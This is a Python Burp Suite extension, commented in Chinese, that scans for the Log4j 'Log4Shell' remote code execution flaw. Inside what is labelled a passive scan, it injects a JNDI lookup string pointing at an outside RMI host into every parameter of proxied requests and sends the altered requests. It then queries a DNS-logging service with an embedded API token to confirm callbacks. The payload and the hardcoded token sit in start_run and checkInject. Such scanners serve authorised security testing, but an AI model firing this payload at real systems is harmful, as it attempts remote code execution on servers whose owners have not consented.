# -*-coding:utf-8 -*-
# 被动扫描注入检测
from burp import IBurpExtender, IScannerCheck, IScanIssue, IMessageEditorTabFactory, IContextMenuFactory
from burp import IScanIssue
from javax.swing import JMenuItem
import sys
import re
import random
import string
import time
from threading import Thread
import json
import os
from urlparse import urlparse
from xml.dom import minidom
import xml
from collections import OrderedDict
from Queue import Queue
from traceback import print_exception
import sys
sys.path.append('/Library/Python/2.7/site-packages')
import requests

class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):



        # Required for easier debugging:
        sys.stdout = callbacks.getStdout()

        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。
        self._callbacks = callbacks

        # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。
        self._helpers = callbacks.getHelpers()

        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。
        self._callbacks.setExtensionName("log4j2 rce")

        # 注册扫描
        callbacks.registerScannerCheck(self)

        print 'Load successful - auther:ske\nProject payload from https://github.com/lufeirider/SqlChecker'

    # 获取请求的url
    def get_request_url(self, protocol, reqHeaders):
        link = reqHeaders[0].split(' ')[1]
        host = reqHeaders[1].split(' ')[1]
        return protocol + '://' + host + link

    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数
    def get_request_info(self, request):
        analyzedIRequestInfo = self._helpers.analyzeRequest(request)  # analyzeRequest用于分析HTTP请求，并获取有关它的各种关键详细信息。生成的IRequestInfo对象
        reqHeaders = analyzedIRequestInfo.getHeaders()  # 用于获取请求中包含的HTTP头。返回：请求中包含的HTTP标头。
        reqBodys = request[analyzedIRequestInfo.getBodyOffset():].tostring()  # 获取消息正文开始的请求中的偏移量。返回：消息正文开始的请求中的偏移量。
        reqMethod = analyzedIRequestInfo.getMethod()  # 获取请求方法
        reqParameters = analyzedIRequestInfo.getParameters()
        return analyzedIRequestInfo, reqHeaders, reqBodys, reqMethod, reqParameters

    # 获取响应的一些信息：响应头，响应内容，响应状态码
    def get_response_info(self, response):
        analyzedIResponseInfo = self._helpers.analyzeRequest(response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
        resHeaders = analyzedIResponseInfo.getHeaders()  # getHeaders方法用于获取响应中包含的HTTP标头。返回：响应中包含的HTTP标头。
        resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()  # getBodyOffset方法用于获取消息正文开始的响应中的偏移量。返回：消息正文开始的响应中的偏移量。response[analyzedResponse.getBodyOffset():]获取正文内容
        # resStatusCode = analyzedIResponseInfo.getStatusCode()  # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。
        return resHeaders, resBodys


    # 获取服务端的信息，主机地址，端口，协议
    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        ishttps = False
        if protocol == 'https':
            ishttps = True
        return host, port, protocol, ishttps

    # 获取请求的参数名、参数值、参数类型（get、post、cookie->用来构造参数时使用）
    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()         # Cookies 2， POST 1
        return parameterName, parameterValue, parameterType

    # 通过正则匹配是否是报错注入

    # 保存RCE点
    def save(self, content):
        with open('isRCE', 'at') as f:
            f.writelines('{}\n'.format(content))

    # 保存检测过的数据包
    def save_checked(self, json_data):
        with open('rceChecked.txt', 'at') as f:
            f.writelines('{}\n'.format(str(json_data)))

    # 判断是否检测过
    def isNotCheck(self, json_data):
        # 如果sqlChecked文件不存在，说明是第一次执行插件，那么肯定没有被检测过
        if not os.path.exists('rceChecked.txt'):
            return True

        with open('rceChecked.txt', 'rt') as f:
            if str(json_data) + '\n' in f.readlines():      # 有记录，认为该数据包检测过
                return False
            else:
                return True

    # 过滤一些css等后缀
    def filter_url(self, reqUrl):
        noCheckedSuffix = ['css', 'js', 'jpg', 'gif', 'html', 'png', 'ico', 'svg', 'jpeg']
        if reqUrl.rsplit('.')[-1] in noCheckedSuffix or urlparse(reqUrl).path.rsplit('.')[-1] in noCheckedSuffix:
            return True
        else:
            return False
    def ranstr(self,num):
        H = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        salt = ''
        for i in range(num):
           salt += random.choice(H)

        return salt


    # 检测rce
    def checkInject(self, parameterRCEsQueue):
        while not parameterRCEsQueue.empty():
            request, protocol, httpService, parameterName, parameterValue, payload, parameterType, reqUrl,cs = parameterRCEsQueue.get()
            parameterValueRCE = parameterValue + payload
            print(parameterValueRCE)
            # 构造参数
            newParameter = self._helpers.buildParameter(parameterName, parameterValueRCE, parameterType)

            # 更新参数，并发送请求
            newRequest = self._helpers.updateParameter(request, newParameter)
            newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
                newRequest)

            #更新header中参数数据，并发起请求
            # analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters = self.get_request_info(request)
            # print(reqHeaders)


            # 新的响应
            newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)          # IHttpRequestResponse
            # print dir(newResponse)
            # 请求超时，pass该payload -> 所以continue
            if newIHttpRequestResponse == None:
                # print '{} IHttpRequestResponse is None'.format(parameterValueRCE)
                continue

            response = newIHttpRequestResponse.getResponse()        # 获取响应包
            if response == None:
                # print '{} Response is None'.format(parameterValueRCE)
                continue

        
            newReqUrl = self.get_request_url(protocol, newReqHeaders)
            ti=3+random.randint(0,9)
            time.sleep(ti)
            
            r = requests.get("http://api.ceye.io/v1/records?token=ccb64356c10db6c37bf7d6c30d72677c&type=dns&filter="+str(cs))
            
            result = r.text.find(cs)
            
            
            # 存在
            if result>0:
                content = '[+] [Error] Method: [{}]\nReqUrl: [{}]\nparameter: [{}]\nparameterValue: [{}]\n[Headers] -> {}\n[Bodys] -> {}\n'.format(
                                                     newReqMethod, newReqUrl, parameterName, parameterValueRCE, newReqHeaders, newReqBodys)
                self.save(content)
                self.issues.append(CustomScanIssue(
                                    newIHttpRequestResponse.getHttpService(),
                                    self._helpers.analyzeRequest(newIHttpRequestResponse).getUrl(),
                                    [newIHttpRequestResponse],
                                    "LOG4J RCE - {}".format(parameterName),
                                    "LOG4J RCE {}".format(newReqUrl),
                                    "High"))

            else:
                pass



    # 开始检测
    def start_run(self, baseRequestResponse):
        self.baseRequestResponse = baseRequestResponse

        # 获取请求包的数据
        request = self.baseRequestResponse.getRequest()

        analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters = self.get_request_info(request)

        # 获取响应包的数据
        # resHeaders, resBodys = self.get_response_info(self.baseRequestResponse)
        # self.save(resBodys)

        # 获取服务信息
        httpService = self.baseRequestResponse.getHttpService()
        host, port, protocol, ishttps = self.get_server_info(httpService)

        # 获取请求的url
        reqUrl = self.get_request_url(protocol, reqHeaders)

        print 'start check url: {}'.format(reqUrl)
        if self.filter_url(reqUrl):
            print 'not check url: {}'.format(reqUrl)
            return



        # 分离出参数名, 例如：parameterNames: PHPSESSID&uname&passwd&submit
        parameterNames = ''
        for parameter in reqParameters:
            parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)
            parameterNames += parameterName + '&'
        parameterNames = parameterNames[:-1]

        
        url_parse = urlparse(reqUrl)
        noParameterUrl = url_parse.scheme + '://' + url_parse.netloc + url_parse.path

        # 通过url，方法，参数 -> 识别数据包是否检测过
        json_data = {"noParameterUrl": noParameterUrl, "method": reqMethod, "parameterNames": parameterNames}
        if not self.isNotCheck(json_data):
            print '[checked] {}'.format(json_data)
            return True
        self.save_checked(json_data)


        # 将payload加载到队列里
        parameterRCEsQueue = Queue(-1)  # payload队列
        for parameter in reqParameters:
            cs=self.ranstr(6)
            
            payload=r"${jndi:rmi://"+"10.108.242.3:1099/yptesttiger"+ cs + "}"
            parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)     # 过滤掉cookies
            parameterRCEsQueue.put([request, protocol, httpService, parameterName, parameterValue, payload,
                                        parameterType, reqUrl,cs])  # 构造新的参数值

        # 多线程跑每个payload
        threads = []
        for i in range(3):
            t = Thread(target=self.checkInject, args=(parameterRCEsQueue, ))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        print '#' * 60 + 'end' + '#' * 60



    def doPassiveScan(self, baseRequestResponse):
        '''
        :param baseRequestResponse: IHttpRequestResponse
        :return:
        '''
        self.issues = []
        self.start_run(baseRequestResponse)
        return self.issues


    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        '''
        相同的数据包，只报告一份报告
        :param existingIssue:
        :param newIssue:
        :return:
        '''

        if existingIssue.getIssueDetail() == newIssue.getIssueDetail():
            return -1

        return 0


class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        '''

        :param httpService: HTTP服务
        :param url: 漏洞url
        :param httpMessages: HTTP消息
        :param name: 漏洞名
        :param detail: 漏洞细节
        :param severity: 漏洞等级
        '''
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
